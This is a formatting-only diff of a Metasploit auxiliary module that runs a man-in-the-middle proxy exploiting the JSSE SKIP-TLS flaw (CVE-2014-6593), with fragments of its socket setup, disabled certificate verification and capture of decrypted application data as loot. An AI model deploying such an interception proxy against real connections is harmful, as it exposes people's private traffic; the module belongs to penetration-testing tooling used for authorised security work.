@@ -10,8 +10,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',
-      'Description'    => %q{
+      'Name' => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',
+      'Description' => %q{
         This module exploits an incomplete internal state distinction in Java Secure
         Socket Extension (JSSE) by impersonating the server and finishing the
         handshake before the peers have authenticated themselves and instantiated
@@ -22,20 +22,17 @@ class MetasploitModule < Msf::Auxiliary
         plaintext application data transmitted between the peers to be saved. This
         module requires an active man-in-the-middle attack.
       },
-      'Author'      =>
-        [
-          'Ramon de C Valle'
-        ],
+      'Author' => [
+        'Ramon de C Valle'
+      ],
       'License' => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Service', 'Description' => 'Run MITM proxy' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Service'
-        ],
-      'DefaultAction'  => 'Service',
+      'Actions' => [
+        [ 'Service', 'Description' => 'Run MITM proxy' ]
+      ],
+      'PassiveActions' => [
+        'Service'
+      ],
+      'DefaultAction' => 'Service',
       'References' => [
         ['CVE', '2014-6593'],
         ['CWE', '372'],
@@ -55,7 +52,8 @@ class MetasploitModule < Msf::Auxiliary
         OptPort.new('PORT', [ true, 'The server port', 443]),
         OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
         OptString.new('SRVPORT', [ true, 'The proxy port', 443])
-      ])
+      ]
+    )
   end
 
   def cleanup
@@ -109,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
     @proxy = Rex::Socket::TcpServer.create(
       'LocalHost' => local_host,
       'LocalPort' => local_port,
-      'Context'   => {
+      'Context' => {
         'Msf' => framework,
         'MsfExploit' => self
       }
@@ -130,13 +128,14 @@ class MetasploitModule < Msf::Auxiliary
         fake_server = Rex::Socket::Tcp.create(
           'PeerHost' => fake_host,
           'PeerPort' => fake_port,
-          'SSL'      => true,
+          'SSL' => true,
           'SSLVerifyMode' => 'NONE',
-          'Context'  =>
+          'Context' =>
             {
-              'Msf'        => framework,
+              'Msf' => framework,
               'MsfExploit' => self
-            })
+            }
+        )
         add_socket(fake_server)
 
         print_status('Connected to %s:%d' % [fake_host, fake_port])
@@ -144,11 +143,12 @@ class MetasploitModule < Msf::Auxiliary
         server = Rex::Socket::Tcp.create(
           'PeerHost' => host,
           'PeerPort' => port,
-          'Context'  =>
+          'Context' =>
             {
-              'Msf'        => framework,
+              'Msf' => framework,
               'MsfExploit' => self
-            })
+            }
+        )
         add_socket(server)
 
         print_status('Connected to %s:%d' % [host, port])
@@ -168,6 +168,7 @@ class MetasploitModule < Msf::Auxiliary
               else
                 header = r.get_once(5)
                 raise EOFError if header.nil?
+
                 fragment_length = header[3, 2].unpack('n')[0]
                 fragment = ''
                 while fragment_length > 0
@@ -241,7 +242,6 @@ class MetasploitModule < Msf::Auxiliary
               end
             end
           end
-
         rescue EOFError, Errno::ECONNRESET
           path = store_loot(
             'tls.application_data',
